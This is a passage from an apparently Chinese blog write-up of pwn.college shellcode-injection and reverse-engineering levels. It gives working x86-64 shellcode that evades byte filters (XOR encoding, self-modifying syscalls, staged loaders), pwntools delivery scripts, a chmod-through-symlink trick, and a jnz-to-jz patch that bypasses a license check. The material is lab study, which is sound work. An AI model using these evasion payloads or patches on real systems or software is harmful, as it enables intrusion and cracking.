3</h2><blockquote><p>这里要求不能使用空字节(0x00)，所以换一种方式。可以对应strcpy的栈溢出，它不能使用空字节</p></blockquote><ul><li><p>这里就是使用 <code>0xffffffffffffffff</code> 和 <code>xor</code> 来实现 level 1的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assemble">mov rcx,0xffffffffffffffff<br>mov rbx,0xffffff989e9399d0<br>xor rbx,rcx# 这里xor之后就是0x00000067616c662f-&gt;&quot;/flag\0&quot;<br>push rbx<br>mov rdi,rsp<br>xor rsi,rsi# 这里异或也可以实现清零<br>mov rax,0xfffffffffffffffd<br>xor rax,rcx<br>syscall<br>mov rcx,0xffffffffffffffff# 这里注意需要重新赋值，因为open之后rcx改变了。这里需要注意，是哦那个gdb才调试出来的<br>mov rdi,0xfffffffffffffffe<br>xor rdi,rcx<br>mov rsi,rax<br>xor rdx,rdx<br>mov r10,0xfffffffffffffc17<br>xor r10,rcx<br>mov rax,0xffffffffffffffd7<br>xor rax,rcx<br>syscall<br>mov rax,0xffffffffffffffc3<br>xor rax,rcx<br>syscall<br></code></pre></td></tr></table></figure></li><li><p>另外这里对于&quot;/flag\0&quot;还可以采用直接赋值的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ass"># mov rbx,0x00000067616c662f<br># push rbx<br># mov rdi,rsp<br>mov byte ptr [rsp], &#x27;/&#x27;<br>mov byte ptr [rsp+1], &#x27;f&#x27;<br>mov byte ptr [rsp+2], &#x27;l&#x27;<br>mov byte ptr [rsp+3], &#x27;a&#x27;<br>mov byte ptr [rsp+4], &#x27;g&#x27;<br>xor cl, cl<br>mov byte ptr [rsp+5], cl<br></code></pre></td></tr></table></figure></li><li><p>对于rax设置成小数值可以采用 <code>inc</code> 或者给限定内存赋值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure></li></ul><p>​gdb调试指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">生成二进制程序，这里注意在 syscall 后面可以使用 int 3 来中断，然后结合gdb来调试</span><br>gcc -Wl,N -static -nostdlib d.s -o d.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">l 是链接，其中提供了.text段可写(服务于类似 inc byte ptr [rip])</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">w 不生成警告，有的警告不能编译</span><br>gdb d.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">提取机器码d.bin，这里就是把.text段单独拿出来</span><br>objcopy --dump-section .text=d.bin d.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看转化后的十六进制数据</span><br>hd d.bin <br><span class="hljs-meta prompt_"># </span><span class="language-bash">将shellcode传入程序</span><br>cat d.bin | /challenge/babyshell_level1<br></code></pre></td></tr></table></figure><h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2><blockquote><p>过滤了扩展指令0x48(H)，0x40是扩展长度指令的标志，对于64位寄存器的操作会出现这个标志</p><p>ps: push、pop 64寄存器；使用r8、r9寄存器 都不会出现0x48</p></blockquote><p>​可以先查看哪些指令使用0x48，然后再逐个攻破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -nostdlib -static d.s -o d.elf<br>objdump -M intel -d d.elf | grep 48<br></code></pre></td></tr></table></figure><p>​然后wp就容易了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">from pwn import *<br>import glob<br>context.log_level=&#x27;info&#x27;<br>context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;, log_level=&quot;debug&quot;)<br>binary_paths = glob.glob(&quot;/challenge/babyshell_level[0-9]&quot;)<br>r = process(binary_paths)<br>shellcode = &quot;&quot;&quot;<br>  mov r8,0x00000067616c662f<br>  push r8<br>  push rsp<br>  pop rdi# 这里通过push,pop来传递数据<br>  xor esi,esi<br>  mov al,2<br>  syscall<br><br>  mov edi,1<br>  push rax<br>  pop rsi<br>  mov edx,0<br>  mov r10,1000<br>  mov al,40<br>  syscall<br><br>  mov al,60<br>  syscall<br>&quot;&quot;&quot;<br>payload = asm(shellcode,arch=&quot;amd64&quot;)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2><blockquote><p>不能用 0f05 (<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>)</p></blockquote><p>​有点玄学，一开始过不去，之后突然就能过了，很奇怪。本来以为过不去是需要.text段可写才行，然后它gcc使用<code>-Wl,N</code> 还报错链接不了，不知道教程上那个视频用这个命令咋成功的。</p><p>​补充：看了下一题才明白，它原来本身就有 write 的权限。Removing write permissions from first 4096 bytes of shellcode。下一题取消了前 4096 byte 的写权限，说明之前本身就有权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc byte ptr [rip+syscall1]<br>    inc byte ptr [rip+syscall2]<br>    inc byte ptr [rip+syscall3]# 修改.byte来绕过检测<br>    mov rbx,0x00000067616c662f<br>    push rbx<br>    mov rdi,rsp<br>    mov rsi,0<br>    mov rax,2<br>syscall1:  <br>    .byte 0x0e<br>    .byte 0x05<br><br>    mov rdi,1<br>    mov rsi,rax<br>    mov rdx,0<br>    mov r10,1000<br>    mov rax,40<br>syscall2:  <br>    .byte 0x0e<br>    .byte 0x05<br><br>    mov rax,60<br>syscall3:  <br>    .byte 0x0e<br>    .byte 0x05<br></code></pre></td></tr></table></figure><p>​还可以使用 <code>jmp</code> 来跳转到栈上的syscall，但是这个只适用于只有一个系统调用的，例如 <code>execve(path='/bin///sh', argv=['sh','-p'], envp=0) </code>(这是由shellcraft.execve(‘sh’,[‘sh’,‘-p’])生成的，这里如果没有-p，那么这个shell就没有相应权限了。该程序好像有特定的格式，自己写的老是不对)，因为调用了就回不到现在的程序了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#syscall<br>   push 0x050e<br>   inc qword ptr [rsp]<br>   jmp rsp<br></code></pre></td></tr></table></figure><h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2><blockquote><p>没太搞明白，这里没有权限的限制</p></blockquote><p>​直接使用chomod给flag权限，然后就可以读到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#chmod<br>mov rax, 90<br>lea rdi, [rip+flag]<br>mov rsi, 4 #other users can read the flag<br>syscall<br><br>#open<br>xor rsi, rsi<br>lea rdi, [rip+flag]<br>xor rax, rax<br>mov al, 2<br>syscall<br><br>#read<br>mov rdi, rax<br>mov rsi, rsp<br>xor rdx, rdx<br>mov dl, 100<br>xor rax, rax<br>syscall<br><br>#write<br>xor rdi, rdi<br>mov dil, 1<br>mov rsi, rsp<br>mov rdx, rax<br>xor rax, rax<br>mov al, 1<br>syscall<br><br>#exit<br>xor rax, rax<br>mov al, 60<br>xor rdi, rdi<br>mov dil, 42<br>syscall<br><br>flag:<br>.ascii &quot;/flag&quot;<br></code></pre></td></tr></table></figure><p>​使用二进制编译之后执行，就可以直接得到flag了。感觉这里用户本身就有权限，更像是运行程序之后，给予了 <code>chmod</code> suid的权限，然后才能使得调用这个可以提权。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@shellcode-injection~level7:~$ ./d.elf <br>pwn.college&#123;Il5WBRfDSBTM94eNhylPYA9USRm.01MyIDL0cDMzQzW&#125;<br>hacker@shellcode-injection~level7:~$ strace ./d.elf <br>execve(&quot;./d.elf&quot;, [&quot;./d.elf&quot;], 0x7ffe48cf0930 /* 24 vars */) = 0<br>chmod(&quot;/flag&quot;, 004)                     = -1 EPERM (Operation not permitted)<br>open(&quot;/flag&quot;, O_RDONLY)                 = 3<br>read(3, &quot;pwn.college&#123;Il5WBRfDSBTM94eNhylP&quot;..., 100) = 57<br>write(1, &quot;pwn.college&#123;Il5WBRfDSBTM94eNhylP&quot;..., 57pwn.college&#123;Il5WBRfDSBTM94eNhylPYA9USRm.01MyIDL0cDMzQzW&#125;<br>) = 57<br>exit(42)                                = ?<br>+++ exited with 42 +++<br>hacker@shellcode-injection~level7:~$ ls -al /flag<br>-------r-- 1 root root 57 Feb  8 03:19 /flag  # 这里之后也能看出/flag文件被设置了权限<br></code></pre></td></tr></table></figure><h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2><blockquote><p>只能用0x12byte，这里利用chmod的特性</p></blockquote><p>​linux软链接和chmod有一个特点，chmod在对软链接(也就是链接文件)进行操作时，并不是直接作用于软链接(也就是链接文件)，而是直接作用于它所指向的文件(也就是真正的文件)。就像我们将我的 home/hacker 目录中的 f 文件链接到 /flag 并且我们 chmod f 文件而不是 /flag 文件一样，如果我们成功更改 f 文件的权限，我们就成功更改 /flag 文件的权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s /flag f # 在当前目录创建软链接<br></code></pre></td></tr></table></figure><p>​下面就是shellcode，总共12个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66push 0x66# 压入&quot;f&quot;<br>48 89 e7    mov rdi,rsp<br>6a 04    push 4# 4-&gt;010其他用户读权限<br>5e    pop rsi# 这里 mov sil,4 也是3个字节<br>b0 5a    mov al,0x5a# 这里只需要两个字节,与sil相比应该是常用寄存器的指令有简化<br>0f 05    syscall<br></code></pre></td></tr></table></figure><h2 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> level 9</h2><blockquote><p>每10个字节之后会被覆盖10个int3，在适当位置填充无用字节即可</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x66<br>    mov rdi,rsp<br>    push 4<br>    pop rsi<br>    jmp next    # eb 0a，与level8结合，算上这两个刚好10byte<br>.rept 10<br>    nop # 这里就被覆盖了10字节的int 3(0xcc)<br>.endr<br>next:<br>    mov al,0x5a<br>    syscall<br></code></pre></td></tr></table></figure><h2 id="level-10-11"><a class="markdownIt-Anchor" href="#level-10-11"></a> level 10-11</h2><blockquote><p>level 10的前面8个字节采用冒泡排序，直接rept填充就行，然后依旧是chmod代码。11添加了关闭stdin，stdout和stderr，步过对于chmod无影响，依旧套用</p></blockquote><h2 id="level-12"><a class="markdownIt-Anchor" href="#level-12"></a> level 12</h2><blockquote><p>要求每个字节都不一样</p></blockquote><p>​这里脚本得改一改，有两个<code>push</code>，所以需要修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66push 0x66<br>48 89 e7    mov rdi,rsp<br>40 b6 04    mov sil,4# 用到了mov sil,4 与push pop一样的字节数<br>b0 5a      mov al,0x5a<br>0f 05     syscall<br></code></pre></td></tr></table></figure><h2 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> level 13</h2><blockquote><p>只读 0xc(12) byte 的数据，上面的shellcode刚好是12字节，直接套用</p></blockquote><p>​出了直接套用上一个shellcode，这里还可以扩充一下，使用<code>execve</code>来执行一下另外的程序来达到目的</p><ul><li><p>创建文件 <code>a</code> ，然后写入数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash -p</span><br><span class="hljs-built_in">id</span><br><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure></li><li><p>之后更改汇编。其中 <code>cdq</code> 将eax的最高位即第31位赋值给edx的每一位，这个指令一般是在32位系统中除法前使用的，就是让edx作为eax的高位组合成64位的数字，让符号统一，它只有一个字节，替换<code>xor edx,edx</code>。这里总共12字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">6a 66push 0x61# 0x61 -&gt; a，这是文件的名称<br>48 89 e7    mov rdi, rsp<br>31 f6    xor esi, esi<br>99    cdq <br>b0 3b    mov al,0x3b# 0x3b -&gt; execve<br>0f 05    syscall<br></code></pre></td></tr></table></figure></li></ul><h2 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> level 14</h2><blockquote><p>这次就是只要 0x6 字节数据了</p></blockquote><p>​gdb调试一下程序 <code>run &lt; d.bin</code> 写入shellcode进行调试。这里刚好在运行 <code>shellcode</code> 之前，<code>rax = 0, rdx = 0x1a009000</code>(这个就是一开始读shellcode的地址)，所以可以再构造一个read，再从<code>0</code> 中读取一个新的shellcode来执行。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402081619678.png" alt="image-20240208161928503" /></p><p>​这里就是 rax(syscall code) = 0，rdx = 0x1a009000(自定义shellcode的起始内存地址)，所以之后需要设置 rdi = 0(fd)，rsi=rdx(char *buf)便可以从输入读取shellcode并在下一步执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor edi,edi<br>mov esi,edx<br>syscall<br></code></pre></td></tr></table></figure><p>​然后设置再次读取的shellcode，这里因为上面是6个字节，所以这里shellcode的起始位置是 0x1a009000 + 6(即rip从新的shellcode的6字节之后开始运行的)，所以之前填充一些nop</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.rept</span> <span class="hljs-number">0x20</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-meta">.endr</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0x66</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">sil</span>,<span class="hljs-number">4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><p>​使用pwntools可以成功，不知道为什么二进制编译过不去。但是二者是一样的，估计得把上面两个放在一起编译才可以。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/babyshell_level[0-9][0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode1 = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    xor edi, edi</span><br><span class="hljs-string">    mov esi,edx</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload1 = asm(shellcode1)<br>shellcode2 = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">.rept 0x20</span><br><span class="hljs-string">    nop</span><br><span class="hljs-string">.endr</span><br><span class="hljs-string">    push 0x66</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov sil,4</span><br><span class="hljs-string">    mov al,0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload2 = asm(shellcode2)<br>r.send(payload1+payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse-engineering"><a class="markdownIt-Anchor" href="#reverse-engineering"></a> Reverse Engineering</h1><blockquote><p>这里 <code>*.0</code> 会给提示，然后 <code>*.1</code> 没有提示，需要分析</p></blockquote><h2 id="基础知识-2"><a class="markdownIt-Anchor" href="#基础知识-2"></a> 基础知识</h2><h3 id="静态逆向"><a class="markdownIt-Anchor" href="#静态逆向"></a> 静态逆向</h3><ul><li>gcc参数<ul><li><code>-static</code>：该选项用于生成静态链接的可执行文件。静态链接意味着所有的库都会被链接到可执行文件中，使得生成的可执行文件不依赖于系统中的动态库。这样的可执行文件在不同的系统上可以直接运行，但可能会占用更多的磁盘空间，并且不能享受系统级别的更新和优化。</li><li><code>-static-pie</code>：该选项生成的是静态链接的<strong>位置无关可执行文件</strong>。与普通的静态链接不同，位置无关的可执行文件可以在内存中的任何位置执行，而不需要重定位。这使得生成的可执行文件在安全性方面更有优势，因为它们难以受到某些攻击(如ROP攻击)的影响。同时，它们也不依赖于系统中的动态库。但是，与普通的静态链接相比，位置无关的静态链接可能会导致稍微增加一些执行开销。</li></ul></li></ul><h3 id="动态逆向"><a class="markdownIt-Anchor" href="#动态逆向"></a> 动态逆向</h3><ul><li>ltrace,strace<ul><li>ltrace traces library calls</li><li>strace traces system calls</li></ul></li></ul><h2 id="level-1-6"><a class="markdownIt-Anchor" href="#level-1-6"></a> level 1-6</h2><p>​strings可以解决大部分问题，后面就是看要求了</p><h2 id="level-7-8"><a class="markdownIt-Anchor" href="#level-7-8"></a> level 7-8</h2><p>​题目不难，主要是对于它 <code>奇偶异或-&gt;交换-&gt;排序</code> 这一流程的理解。这里是对数据处理好的，否则这三步下来很可能只能爆破处理了，由此这里的交换和排序都不用处理了，因为数据是经过处理的，这两步必须互为逆操作才能保证可以逆向出来。所以只用对提取出的最终数据进行<code>异或操作</code>即可。</p><h2 id="level-9-11"><a class="markdownIt-Anchor" href="#level-9-11"></a> level 9-11</h2><blockquote><p>考察 patch 的能力，有可能不止一处需要 patch</p></blockquote><p>​主要点就是下面这个，这里 <code>v12</code> 为程序的基址，一开始输入的 <code>v5</code> 就是距离基址的偏移，<code>v4</code> 就是将要 patch 的数据。这里将偏移为</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082140008.png" alt="image-20240208214047925" /></p><p>​这里将偏移为 <code>0x225B</code> 的地方 patch 为 <code>0x74</code> 即可。就是将判断license正确的判断从 jnz 改为 jz，这样就可以直接通过了。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082142629.png" alt="image-20240208214205586" /></p><p>​</p><blockquote><p>对于11.1，需要注意长跳转和短跳转的问题，修改正确的机器码</p></blockquote><ul><li><p>对于短跳转(short jump)，跳转范围通常是-128到+127字节，也就是在一个字节内可以表示的范围。在这种情况下，<code>jnz</code>的机器码是<code>75</code>，后跟着一个字节的相对地址(偏移量)。</p></li><li><p>对于长跳转(near jump)，跳转范围更大，可以跳转到任意位置。在这种情况下，<code>jnz</code>的机器码是<code>0F 85</code>，后跟着一个32位相对地址(偏移量)，以支持更大范围的跳转目标。</p></li><li><p>长跳转</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082154339.png" alt="image-20240208215454267" /></p></li><li><p>短跳转</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402082156633.png" alt="image-20240208215611592" /></p></li></ul><h2 id="level-12-18"><a class="markdownIt-Anchor" href="#level-12-18"></a> level 12-18</h2><blockquote><p>还是很简单的vm题，只要分清楚每个模拟指令在做什么就可以了。得到答案直接发送bytes类型即可</p></blockquote><h2 id="level-19"><a class="markdownIt-Anchor" href="#level-19"></a> level 19</h2><blockquote><p>主要是搞清楚长度的限制，即明白跳转条件</p></blockquote><p>​read提示的长度和真实比较的长度不匹配，卡了很久，需要手动计算数据比对位置来看接收数据的长度(长度限制可以参考下面对于19.1的分析)。对于19.1，仿照19.0的形式写一个反编译器进行分析，这里使用 idapython 来进行指令的打印。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idc_bc695 <span class="hljs-keyword">import</span> GetRegValue, Byte<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_reg</span>(<span class="hljs-params">regs</span>):<br>    <span class="hljs-keyword">match</span> regs:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;a&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;b&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;c&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">16</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;d&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">64</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;f&#x27;</span><br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;None&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_flags</span>(<span class="hljs-params">a1</span>):<br>    flag_description = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;L&#x27;</span><br>    <span class="hljs-keyword">if</span> a1 &amp; <span class="hljs-number">1</span> != <span class="hljs-number">0</span>:<br>        flag_description += <span class="hljs-string">&#x27;G&#x27;</span><br>    <span class="hljs-keyword">if</span> 